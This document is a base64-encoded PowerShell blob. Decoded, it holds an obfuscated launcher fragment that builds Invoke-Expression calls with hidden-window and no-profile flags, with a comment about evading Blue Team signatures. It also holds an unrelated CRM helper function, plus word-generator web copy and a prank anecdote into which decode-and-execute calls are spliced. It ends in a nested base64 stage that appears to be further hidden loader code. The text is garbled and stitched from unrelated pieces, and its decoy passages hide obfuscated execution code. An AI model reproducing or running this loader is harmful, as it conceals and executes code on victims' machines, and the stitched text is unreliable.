EdldC1SYW5kb20gLUlucHV0IEAoKFQzaTlUNUVqaUJYTTFkTlllM21FRkM1UzBpRVAxVW8yZignR2V0LVZhcmlhYmxlJykpLCh0M2k5dDVFaklCWG0xZG5ZRTNNRWZDNXMwaUVwMXVPMkYoJ0dWJykpLCh0M0k5VDVlSmlCeG0xRG5ZRTNNRWZjNXMwSWVwMVVvMkYoJ1ZhcmlhYmxlJykpKSkgKyAoVDNpOXQ1ZWpJQnhtMURuWUUzbWVGYzVzMEllUDFVTzJmKCcgJyptZHIqJykuTmFtZVsoW2ludF0oKC00ICsgMTMpIC8gKDAgKyAzKSkpLCgxICogKDE4IC0gNykpLDJdLUpvaW4nJyknKSkKICAgICRJbnZva2VFeHByZXNzaW9uU3ludGF4ICs9ICRJbnZvY2F0aW9uT3BlcmF0b3IgKyAoJ3soKDEgLSAxKSArIDApfXsxfSctZicoJywnICcpICsgKEdldC1SYW5kb20gLUlucHV0IEAoKFQzSTlUNWVqSWJ4bTFETllFM21lZkM1czBpRVAxdW8yRignJG96Umxlc1VCa0s3a3NlUEI0d3hlLlRvU3RyaW5nKCknKSksKHQzSTl0NWVqSUJ4bTFETllFM21FZmM1czBJRXAxVW8yRignKFtTdHJpbmddJG96UmxlU3VCa0s3a1NlcGI0V3hlKScpKSkpICsgKCd7KDEgLSAxKX17MX17Mn0nLWYnWygzIC0gMiksKC0oMSArIDEpICsgKFtpbnRdKDEwIC8gMikpKV0rJywnJ3gnLUpvJywnaW4nJyknKQogICAgIyBDb21tZW50aW5nIGJlbG93IG9wdGlvbiBzaW5jZSAkZW52OlB1YmxpYyBkaWZmZXJzIGluIHN0cmluZyB2YWx1ZSBmb3Igbm9uLUVuZ2xpc2ggb3BlcmF0aW5nIHN5c3RlbXMuCiAgICAjJEludm9rZUV4cHJlc3Npb25TeW50YXggKz0gJEludm9jYXRpb25PcGVyYXRvciArICIoIGAkZW52OlB1YmxpY1sxM10rYCRlbnY6UHVibGljWzVdKyd4JykiCgogICAgIyBSYW5kb21seSBjaG9vc2UgZnJvbSBhYm92ZSBpbnZva2Ugb3BlcmF0aW9uIHN5bnRheGVzLgogICAgJEludm9rZUV4cHJlc3Npb24gPSAoR2V0LVJhbmRvbSAtSW5wdXQgJEludm9rZUV4cHJlc3Npb25TeW50YXgpCgogICAgIyBSYW5kb21pemUgdGhlIGNhc2Ugb2Ygc2VsZWN0ZWQgaW52b2tlIG9wZXJhdGlvbi4KICAgICRJbnZva2VFeHByZXNzaW9uID0gKFtDaGFyW11dJEludm9rZUV4cHJlc3Npb24gfCBGb3JFYWNoLU9iamVjdCB7JENoYXIgPSAkXy5Ub1N0cmluZygpLlRvTG93ZXIoKTsgSWYoR2V0LVJhbmRvbSAtSW5wdXQgQCgwLi4xKSkgeyRDaGFyID0gJENoYXIuVG9VcHBlcigpfSAkQ2hhcn0pIC1Kb2luICcnCiAgICAiQEAiCiAgICAjIENob29zZSByYW5kb20gSW52b2tlLUV4cHJlc3Npb24vSUVYIHN5bnRheCBhbmQgb3JkZXJpbmc6IElFWCAoJFNjcmlwdFN0cmluZykgb3IgKCRTY3JpcHRTdHJpbmcgfCBJRVgpCiAgICAkSW52b2tlT3B0aW9ucyAgPSBAKCkKICAgICRJbnZva2VPcHRpb25zICs9IChUM0k5VDVlSmlCeG0xRE55RTNtRWZjNVMwaWVwMXVPMkYoJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAkSW52b2tlRXhwcmVzc2lvbiArICcgJyooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArIChUM0k5VDVlaklCeE0xZG5ZRTNNZUZjNXMwaUVwMXVPMmYoJygnKSkgKyAoVDNpOXQ1ZWpJYnhNMURuWWUzTUVmYzVTMGlFUDFVTzJmKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgJE5ld1NjcmlwdCArICcgJyooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArIChUM2k5dDVlakliWG0xZG5ZZTNtZUZjNXMwaUVQMVVPMkYoJyknKSkgKyAoVDNJOVQ1ZUppYnhtMURueWUzbWVmYzVzMGlFcDFVTzJmKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpCiAgICAkSW52b2tlT3B0aW9ucyArPSAoVDNJOXQ1ZUpJQnhNMWRueWUzbWVmYzVTMEllUDFVbzJmKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgJE5ld1NjcmlwdCArICcgJyooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArIChUM0k5dDVlamlCWG0xZE5ZRTNNRUZjNVMwSUVQMVVPMmYoJ3wnKSkgKyAodDNJOXQ1ZUppQnhtMURueUUzbUVmYzVTMElFcDFVbzJmKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgJEludm9rZUV4cHJlc3Npb24KCiAgICAkTmV3U2NyaXB0ID0gKEdldC1SYW5kb20gLUlucHV0ICRJbnZva2VPcHRpb25zKQoKICAgICMgSWYgdXNlciBkaWQgbm90IGluY2x1ZGUgLVBhc3NUaHJ1IGZsYWcgdGhlbiBjb250aW51ZSB3aXRoIGFkZGluZyBleGVjdXRpb24gZmxncyBhbmQgcG93ZXJzaGVsbC5leGUgdG8gJE5ld1NjcmlwdC4KICAgIElmKCEkUFNCb3VuZFBhcmFtZXRlcnNbKCd7KDIgKyAwKX17KDEgKyAyKX17MH17KDEgKyAwKX0nLWYnVGgnLCdydScsJ1BhJywnc3MnKV0pCiAgICB7CiAgICAgICAgIyBBcnJheSB0byBzdG9yZSBhbGwgc2VsZWN0ZWQgUG93ZXJTaGVsbCBleGVjdXRpb24gZmxhZ3MuCiAgICAgICAgJFBvd2VyU2hlbGxGbGFncyA9IEAoKQogICAgICAgICJAQCIKICAgICAgICAjIEJ1aWxkIHRoZSBQb3dlclNoZWxsIGV4ZWN1dGlvbiBmbGFncyBieSByYW5kb21seSBzZWxlY3RpbmcgZXhlY3V0aW9uIGZsYWdzIHN1YnN0cmluZ3MgYW5kIHJhbmRvbWl6aW5nIHRoZSBvcmRlci4KICAgICAgICAjIFRoaXMgaXMgdG8gcHJldmVudCBCbHVlIFRlYW0gZnJvbSBwbGFjaW5nIGZhbHNlIGhvcGUgaW4gc2ltcGxlIHNpZ25hdHVyZXMgZm9yIGNvbW1vbiBzdWJzdHJpbmdzIG9mIHRoZXNlIGV4ZWN1dGlvbiBmbGFncy4KICAgICAgICAkQ29tbWFuZGxpbmVPcHRpb25zID0gTmV3LU9iamVjdCBTdHJpbmdbXSgwKQogICAgICAgIElmKCRQU0JvdW5kUGFyYW1ldGVyc1soJ3soMCArICgxIC0gMSkpfXsoMyAtIDIpfSctZidOb0V4JywnaXQnKV0pCiAgICAgICAgewogICAgICAgICAgJEZ1bGxBcmd1bWVudCA9IChUM2k5VDVFaklCeG0xRG55RTNtRWZjNVMwaWVwMXVvMkYoJy1Ob0V4aXQnKSk7CiAgICAgICAgICAkQ29tbWFuZGxpbmVPcHRpb25zICs9ICRGdWxsQXJndW1lbnQuU3ViU3RyaW5nKDAsKEdldC1SYW5kb20gLU1pbmltdW0gNCAtTWF4aW11bSAoJEZ1bGxBcmd1bWVudC5MZW5ndGgrMSkpKQogICAgICAgIH0KICAgICAgICBJZigkUFNCb3VuZFBhcmFtZXRlcnNbKCd7MX17KDEgLSAxKX0nLWYnZmlsZScsJ05vUHJvJyldKQogICAgICAgIHsKICAgICAgICAgICRGdWxsQXJndW1lbnQgPSAoVDNpOXQ1RUpJQnhNMURuWUUzbUVmQzVzMElFcDFVTzJmKCctTm9Qcm9maWxlJykpOwogICAgICAgICAgJENvbW1hbmRsaW5lT3B0aW9ucyArPSAkRnVsbEFyZ3VtZW50LlN1YlN0cmluZygwLChHZXQtUmFuZG9tIC1NaW5pbXVtIDQgLU1heGltdW0gKCRGdWxsQXJndW1lbnQuTGVuZ3RoKzEpKSkKICAgICAgICB9CiAgICAgICAgSWYoJFBTQm91bmRQYXJhbWV0ZXJzWygnezB9ezJ9eygxICsgMCl9Jy1mJ05vbkluJywndGl2ZScsJ3RlcmFjJyldKQogICAgICAgIHsKICAgICAgICAgICRGdWxsQXJndW1lbnQgPSAoVDNJOXQ1ZUppYnhNMWRueUUzbUVmYzVzMElFUDF1TzJGKCctTm9uSW50ZXJhY3RpdmUnKSk7CiAgICAgICAgICAkQ29tbWFuZGxpbmVPcHRpb25zICs9ICRGdWxsQXJndW1lbnQuU3ViU3RyaW5nKDAsKEdldC1SYW5kb20gLU1pbmltdW0gNSAtTWF4aW11bSAoJEZ1bGxBcmd1bWVudC5MZW5ndGgrMSkpKQogICAgICAgIH0KICAgICAgICBJZigkUFNCb3VuZFBhcmFtZXRlcnNbKCd7KC0xICsgMil9eygwICsgMCl9Jy1mJ2dvJywnTm9MbycpXSkKICAgICAgICB7CiAgICAgICAgICAkRnVsbEFyZ3VtZW50ID0gKFQzSTl0NWVqSUJ4TTFETlllM01FZmM1czBJRXAxdW8yZignLU5vTG9nbycpKTsKICAgICAgICAgICRDb21tYW5kbGluZU9wdGlvbnMgKz0gJEZ1bGxBcmd1bWVudC5TdWJTdHJpbmcoMCwoR2V0LVJhbmRvbSAtTWluaW11bSA0IC1NYXhpbXVtICgkRnVsbEFyZ3VtZW50Lkxlbmd0aCsxKSkpCiAgICAgICAgfQogICAgICAgICJAQCIKICAgICAgICBJZigkUFNCb3VuZFBhcmFtZXRlcnNbKCd7KDcgLSA0KX17KDIgLSAxKX17KChbaW50XSg4IC8gMikpICsgMSl9eygtMSArIDUpfXswfXsyfSctZid5bCcsJ25kJywnZScsJ1dpJywnU3QnLCdvdycpXSAtT1IgJFdpbmRvd3NTdHlsZSkKICAgICAgICB7CiAgICAgICAgICAgICRGdWxsQXJndW1lbnQgPSAoVDNJOXQ1ZWppQlhtMURueWUzbWVmYzVzMGllcDFVTzJGKCctV2luZG93U3R5bGUnKSkKICAgICAgICAgICAgSWYoJFdpbmRvd3NTdHlsZSkgeyRBcmd1bWVudFZhbHVlID0gJFdpbmRvd3NTdHlsZX0KICAgICAgICAgICAgRWxzZSB7JEFyZ3VtZW50VmFsdWUgPSAkUFNCb3VuZFBhcmFtZXRlcnNbKCd7MX17KCgxICsgMCkgLSAoMyAtIDIpKX0nLWYnU3R5bGUnLCdXaW5kb3cnKV19CgogICAgICAgICAgICAjIFJhbmRvbWx5IGRlY2lkZSB0byB3cml0ZSBXaW5kb3dTdHlsZSB2YWx1ZSB3aXRoIGZsYWcgc3Vic3RyaW5nIG9yIGludGVnZXIgdmFsdWUuCiAgICAgICAgICAgIFN3aXRjaCgkQXJndW1lbnRWYWx1ZS5Ub0xvd2VyKCkpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICgneygoMSAqIDUpIC0gMyl9eyhbaW50XSgxNSAvIDMpKX17KC0oMiArIDIpICsgKC0zICsgMTEpKX17MX17KC0oLTIgKyA0KSArICgxMCAtIDUpKX17KDEgLSAxKX0nLWYnbCcsJ20nLCduJywnYScsJ3InLCdvJykgICAge0lmKEdldC1SYW5kb20gLUlucHV0IEAoMC4uMSkpIHskQXJndW1lbnRWYWx1ZSA9IChHZXQtUmFuZG9tIC1JbnB1dCBAKChUM2k5dDVlSmlCeG0xRE55RTNtZWZjNXMwaWVwMVVPMmYoJygwICsgMCknKSksKFQzSTl0NWVqaUJ4TTFETnllM01FRmM1czBJZVAxVU8yZignbicpKSwoVDNJOXQ1ZUppYlhtMWROeUUzTUVmYzVzMGlFcDF1TzJmKCdubycpKSwodDNJOVQ1ZWpJYlhNMWRueUUzTUVmQzVzMElFUDFVTzJmKCdub3InKSksKFQzSTl0NUVKSWJ4TTFEbnllM21lZmM1czBJZVAxVU8yZignbm9ybScpKSwodDNJOVQ1RWppYnhtMUROeWUzbUVmYzVTMGlFcDF1bzJGKCdub3JtYScpKSkpfX0KICAgICAgICAgICAgICAgICgneygwICsgMCl9eygyIC0gMSl9Jy1mJ2hpZCcsJ2RlbicpICAgIHtJZihHZXQtUmFuZG9tIC1JbnB1dCBAKDAuLjEpKSB7JEFyZ3VtZW50VmFsdWUgPSAoR2V0LVJhbmRvbSAtSW5wdXQgQCgoVDNpOXQ1RWppQlhNMURuWWUzbUVGYzVzMGllUDF1bzJGKCcoKC0xICsgNCkgLSAyKScpKSwoVDNJOXQ1RWppQnhNMUROeUUzTUVGYzVTMGlFcDF1bzJmKCdoJykpLCh0M0k5dDVlaklCeG0xZG55RTNNRUZjNVMwaWVwMXVPMkYoJ2hpJykpLChUM0k5dDVlSklCWE0xZG55ZTNtRWZjNXMwSUVwMVVPMmYoJ2hpZCcpKSwoVDNJOVQ1ZUpJQnhtMURueUUzbUVmYzVzMElFcDFVbzJGKCdoaWRkJykpLChUM0k5dDVlaklCWG0xZG55ZTNNZWZjNVMwSWVwMXVPMkYoJ2hpZGRlJykpKSl9fQogICAgICAgICAgICAgICAgKCd7KC0oMyArIDEpICsgKC0xICsgOSkpfXsoLSgtNSArIDEzKSArICgtMTIgKyAyOCkpfXsoMSArICgtMSArIDIpKX17OH17KC0oMiAqIDIpICsgKDE3IC0gOSkpfXsoW2ludF0oMzIgLyA0KSl9eygoMiArIDApICogMyl9eygxMyAtIDYpfXsxfSctZidpJywnZCcsJ24nLCdtJywnbScsJ2knLCd6JywnZScsJ2knKSB7SWYoR2V0LVJhbmRvbSAtSW5wdXQgQCgwLi4xKSkgeyRBcmd1bWVudFZhbHVlID0gKEdldC1SYW5kb20gLUlucHV0IEAoKFQzSTl0NWVqaUJ4bTFEbllFM21FRkM1czBpRVAxdU8yZignMicpKSwoVDNJOVQ1RWppYnhtMURueUUzbWVGQzVTMGlFUDFVTzJmKCdtaScpKSwoVDNJOXQ1ZUpJQlhNMUROWUUzTUVGYzVzMElFcDF1bzJmKCdtaW4nKSksKHQzSTl0NUVqSUJ4bTFEbllFM21FZkM1czBpRVAxVU8yZignbWluaScpKSwodDNJOXQ1RWppQnhtMURueWUzbUVGYzVTMGlFcDFVTzJGKCdtaW5pbScpKSwoVDNpOXQ1ZWpJQlhNMURueUUzbUVmQzVzMEllUDF1TzJmKCdtaW5pbWknKSksKFQzSTlUNWVqSUJ4bTFEbnllM21FZmM1UzBJRXAxVU8yZignbWluaW1peicpKSwoVDNJOXQ1ZWppQnhtMURuWUUzTUVGYzVzMGlFUDF1TzJGKCdtaW5pbWl6ZScpKSkpfX0KICAgICAgICAgICAgICAgICgnezF9eygxIC0gMSl9Jy1mJ2l6ZWQnLCdtYXhpbScpIHtJZihHZXQtUmFuZG9tIC1JbnB1dCBAKDAuLjEpKSB7JEFyZ3VtZW50VmFsdWUgPSAoR2V0LVJhbmRvbSAtSW5wdXQgQCgoVDNJOVQ1ZUpJYnhNMURueWUzbUVmYzVTMGllUDFVTzJGKCcoW2ludF0oNiAvIDIpKScpKSwoVDNJOVQ1ZUppQnhtMWROeWUzTWVGQzVTMGllcDFVTzJGKCdtYScpKSwodDNJOXQ1RWpJQnhtMWROeUUzTUVmYzVTMGlFcDFVbzJGKCdtYXgnKSksKFQzSTl0NWVKSUJ4bTFEbllFM21lZkM1UzBJRXAxVU8yRignbWF4aScpKSwoVDNJOXQ1RWpJYnhNMURuWWUzbWVGYzVzMGllcDF1TzJmKCdtYXhpbScpKSwodDNJOXQ1RUppQnhtMUROWWUzbWVGYzVzMElFcDF1TzJmKCdtYXhpbWknKSksKHQzaTl0NWVqSWJYTTFEbllFM21lZmM1czBpZVAxVU8yZignbWF4aW1peicpKSwodDNJOXQ1ZWpJYnhtMWRuWUUzbUVmQzVTMElFcDFVTzJmKCdtYXhpbWl6ZScpKSkpfX0KICAgICAgICAgICAgICAgIGRlZmF1bHQge1dyaXRlLUVycm9yICgneygoMyAtIDIpICsgMyl9ezEyfXsoMSAqIDEzKX17Mn17KC0xICsgMil9eygoW2ludF0oNiAvIDIpKSAqIDMpfXsoKDMgLSAxKSAqICgyICogMikpfXsoLTggKyAoMTEgKyA3KSl9eygoMTcgLSA0KSAtICgtMiArIDQpKX17KC0xICsgNCl9eygzICogMil9ezB9eygyICsgMyl9eygxICogNyl9eyhbaW50XSg3MCAvICg1ICsgMCkpKX0nLWYnZm9yIE91dCcsJ2FsdWUgKCRkaUFzbmlyWnNqN2InLCdWYWx1ZSB2JywnIHN3aXRjaCcsJ0FuIGludmEnLCctUG93ZXJTJywnIGJsb2NrICcsJ2hlbGxMYXUnLCd0VmFsdWUpJywnQXJndW1lbicsJyB3YXMgcGEnLCdzc2VkIHRvJywnbGlkIGAkWWJzTUxCMG40eXBoS3JFTTlDY0YnLCdyZ3VtZW50JywnbmNoZXIuJyk7IEV4aXQ7fQogICAgICAgICAgICB9CgogICAgICAgICAgICAkUG93ZXJTaGVsbEZsYWdzICs9ICRGdWxsQXJndW1lbnQuU3ViU3RyaW5nKDAsKEdldC1SYW5kb20gLU1pbmltdW0gMiAtTWF4aW11bSAoJEZ1bGxBcmd1bWVudC5MZW5ndGgrMSkpKSArICcgJyooR2V0LVJhbmRvbSAtTWluaW11bSAxIC1NYXhpbXVtIDMpICsgJEFyZ3VtZW50VmFsdWUKICAgICAgICB9CiAgICAgICAgSWYoJFAKIkAKCmZ1bmN0aW9uIDQoKSB7CiAgICBQQVJBTSgKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSldCiAgICAgICAgW29iamVjdF0kRW50aXR5TG9naWNhbE5hbWUKICAgICkKCiAgICAkc3RhbmRhcmRBY3Rpdml0eUVudGl0aWVzID0gQCgKICAgICAgICAib3Bwb3J0dW5pdHljbG9zZSIsCiAgICAgICAgInNvY2lhbGFjdGl2aXR5IiwKICAgICAgICAiY2FtcGFpZ25yZXNwb25zZSIsCiAgICAgICAgImxldHRlciIsIm9yZGVyY2xvc2UiLAogICAgICAgICJhcHBvaW50bWVudCIsCiAgICAgICAgInJlY3VycmluZ2FwcG9pbnRtZW50bWFzdGVyIiwKICAgICAgICAiZmF4IiwKICAgICAgICAiZW1haWwiLAogICAgICAgICJhY3Rpdml0eXBvaW50ZXIiLAogICAgICAgICJpbmNpZGVudHJlc29sdXRpb24iLAogICAgICAgICJidWxrb3BlcmF0aW9uIiwKICAgICAgICAicXVvdGVjbG9zZSIsCiAgICAgICAgInRhc2siLAogICAgICAgICJjYW1wYWlnbmFjdGl2aXR5IiwKICAgICAgICAic2VydmljZWFwcG9pbnRtZW50IiwKICAgICAgICAicGhvbmVjYWxsIgogICAgKQogICAgIyBTb21lIEVudGl0eSBoYXMgZGlmZmVyZW50IHBhdHRlcm4gZm9yIGlkIG5hbWUuCiAgICBpZigkRW50aXR5TG9naWNhbE5hbWUgLWVxICJ1c2Vyc2V0dGluZ3MiKQogICAgewogICAgICAgICRwcmltYXJ5S2V5RmllbGQgPSAic3lzdGVtdXNlcmlkIgogICAgfQogICAgZWxzZWlmKCRFbnRpdHlMb2dpY2FsTmFtZSAtZXEgInN5c3RlbWZvcm0iKQogICAgewogICAgICAgICRwcmltYXJ5S2V5RmllbGQgPSAiZm9ybWlkIgogICAgfQogICAgZWxzZWlmKCRFbnRpdHlMb2dpY2FsTmFtZSAtaW4gJHN0YW5kYXJkQWN0aXZpdHlFbnRpdGllcykKICAgIHsKICAgICAgICAkcHJpbWFyeUtleUZpZWxkID0gImFjdGl2aXR5aWQiCiAgICB9CiAgICBlbHNlIAogICAgewogICAgICAgICMgZGVmYXVsdAogICAgICAgICRwcmltYXJ5S2V5RmllbGQgPSAkRW50aXR5TG9naWNhbE5hbWUgKyAiaWQiCiAgICB9CiAgICAKICAgICRwcmltYXJ5S2V5RmllbGQKfQo8Iz4+ClNwPWVsbGluZyBhbmQgYygpClRoaXMgdG9vbCBjYW4gYmUgYW4gZXhjZWxsZW50IHdheSB0byBpbXByb3ZlIGMoKSBvciBwcmFjdGljZSBmb3IgcigpIGJlZXMuIElmIGFuIHEoKSB3b3JkIG8oKSwgcCgpIHVwIHRoZSBtZWFuaW5nIHdpbGwgaGVscCBzdHVkZW50cyBpbmNyZWFzZSB0aGUgbnVtYmVyIG9mIHdvcmRzIHRoZXkga25vdy4gV29ya2luZyB3aXRoIGEgcGFydG5lciwgc3R1ZGVudHMgY2FuIHRlc3QgZWFjaCBvdGhlciBvbiB0aGUgcigpIGZvciB0aGUgcmFuZG9taXplZCB3b3JkcyBtKClkLgoKTmFtZSBJbnNwaXJhdGlvbgpJZiB5b3UgbmVlZCB0byBjcmVhdGUgYSBuYW1lIGZvciBhIHByb2R1Y3QsIGFuIGV2ZW50LCBhIGJhbmQgb3IgZm9yIGFueXRoaW5nIGVsc2UsIHRoaXMgdG9vbCBjYW4gYmUgcXVpdGUgaGVscGZ1bC4gQXMgeW91IGNvbnNpZGVyIG5hbWVzLCBtKCkgYSBudW1iZXIgb2YgcmFuZG9tIHdvcmRzIGFuZCBzZWUgaG93IHRoZXkgaW1wYWN0IHdoYXQgeW91IGhhdmUgYWxyZWFkeSBjb21lIHVwIHdpdGguIElucHV0dGluZyB1bmlxdWUgd29yZHMgeW91IG1heSBub3QgaGF2ZSBjb25zaWRlcmVkIGNhbiBzcGFyayBhZGRpdGlvbmFsIGNyZWF0aXZpdHkgdG8gZXZlbnR1YWxseSBoZWxwIHlvdSBwcm9kdWNlIHRoZSBwZXJmZWN0IG5hbWUgZm9yIHlvdXIgcHJvamVjdC4gSWYgeW91J3JlIHAoKSBmb3IgZ29vZCBjaGFyYWN0ZXIgbmFtZXMgb3IgYmFieSBuYW1lcywgeW91IG1pZ2h0IGJlIGludGVyZXN0ZWQgaW4gb3VyIHJhbmRvbSBuYW1lIGdlbmVyYXRvci4KClRoZSBhYm92ZSBsaXN0IGlzIG5vdCBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKC4gVGhlcmUgYXJlIGxpdGVyYWxseSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCBvZiB3YXlzIHRoZSBSYW5kb20gV29yZCBHZW5lcmF0b3IgY2FuIGJlIHVzZWQuIFBsZWFzZSBmZWVsIGZyZWUgdG8gc2hhcmUgdGhlIHdheSB5b3UgdXNlIHRoaXMgdG9vbCwgYW5kIHdlIGFsd2F5cyB3ZWxjb21lIHN1Z2dlc3Rpb25zIG9uIGhvdyB3ZSBjYW4gaW1wcm92ZSBpdCB0byBzZXJ2ZSB5b3UgYmV0dGVyLiBXZSBhcmUgYWxzbyBpbnRlcmVzdGVkIGluIG5ldyB3b3JkIGdlbmVyYXRvcnMgeW91J2QgYmUgaW50ZXJlc3RlZCBpbiB1cyBjcmVhdGluZy4gTWFueSBvZiB0aGUgdG9vbHMgb24gdGhpcyB3ZWJzaXRlIGNhbWUgZnJvbSBpZGVhcyBmcm9tIHBlb3BsZSBsaWtlIHlvdSB3aG8gY29udGFjdGVkIHVzLiBQbGVhc2UgdGFrZSB0aGUgdGltZSB0byBleHBsb3JlIHRoZSBvdGhlciByYW5kb20gZ2VuZXJhdG9ycyB3ZSBoYXZlIGF2YWlsCgojPjwjPuKAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIHJlc3Ryb29tIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgo8Iz7igJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSByZXN0cm9vbSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyICM+JFdVSkpFeUNpZ0NJS1dyZ2x4ID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygiSkdVeFQxbFFOblU1Y1dnMFpXNDVNQ0E5SUZ0VGVYTjBaVzB1VkdWNGRDNUZibU52WkdsdVoxMDZPbFZVUmpndVIyVjBVM1J5YVc1bktGdFRlWE4wWlcwdVEyOXVkbVZ5ZEYwNk9rWnliMjFDWVhObE5qUlRkSEpwYm1jb0lsRkRWbmRXVlVwelUxZE5ObVpxWnpWTVJHZDZTbE5XVVZaVlNrMWhWMDAyWm1wVmMwMVRWa1JUUnpsbFNVYzViVmhwVmxGa1ZVcHpVMVZOTm1acVVUSk1SRVV5U2xkWlMxVXdWakJKUmtwbFVGVndibGhwVm5kV1ZVcE5VMWROTm1acVJYcE1SRVZzV0cxa01GSXhhRFpLV0VKV1VXdDRTbGw2Y0N0T1EzZDRTbGhqYkdOR1ZrTlVSV3hxVDI0MGVFMVRkM2hLVmpWdllsTldkMVpWU2sxVFYwMDJabXBGZDB4RVJXeFliRTVsVTBWc1pWUXhOVUpEYkRSc1kwWldRMkpGYkVSUGJqUjRUa04zZUVwV05VMUtXRUpXVVcxNGNGRjZjQ3RPVkZWelRWUmpiRmhwVm5ka1YwcHpVMWROTm1acVVYTk5VMVZMVVVZMWJGaHRUV3hqYW5BclRWUlZjMDFUVm1WS1dFazJabXBGTTB4RVJXeEpSalJzWTJwd0swMVVZM05OVTFaMVEybFdlVTl1TkhsTVJFVnNXbWxDZFdKNVZubFBialF3VEVSRmJFbERTV3hOVTBrNVVGTkthR0pXT1doYVJ6RndZbWxKWjB0SVFuWmtNbFo1WXpKb2JHSkhkMmRNV0dSd1ltMVNkbVF6VGpCbFYzaHNTVWRvY0ZwSFVteGlhVUYwVkcwNVVVbElUakJaV0Vvd1RGaENlV0l5VG14ak0wMW5URm